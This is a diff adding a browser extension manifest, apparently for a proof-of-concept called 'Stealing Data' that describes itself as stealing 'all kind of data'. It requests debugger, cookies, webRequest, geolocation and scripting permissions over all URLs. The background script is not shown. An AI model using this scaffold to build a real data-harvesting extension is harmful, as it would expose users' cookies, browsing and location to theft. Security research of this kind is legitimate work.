@@ -1,0 +1,21 @@
+{
+    "name": "Stealing Data",
+    "description": "Steals all kind of data, POC",
+    "version": "0.1.0",
+    "manifest_version": 3,
+    "background": {
+        "service_worker": "background.js"
+    },
+    "permissions": [
+        "debugger",
+        "activeTab",
+        "scripting",
+        "webNavigation",
+        "webRequest",
+        "cookies",
+        "geolocation"
+    ],
+    "host_permissions": [
+        "<all_urls>"
+    ]
+}
